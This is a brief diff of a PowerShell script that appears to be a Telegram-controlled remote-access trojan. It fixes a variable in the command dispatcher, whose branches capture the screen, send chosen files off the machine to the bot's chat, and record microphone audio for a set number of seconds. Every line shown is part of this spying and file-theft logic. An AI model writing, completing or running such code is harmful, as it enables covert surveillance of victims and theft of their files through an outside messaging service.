@@ -153,7 +153,7 @@ test-command {param ($comando="",$botkey="",$chat_id="")
  if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
- if ($comando -like "/Audio*") {$comando = $comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $comando}
+ if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $segundos}
 
 
 }
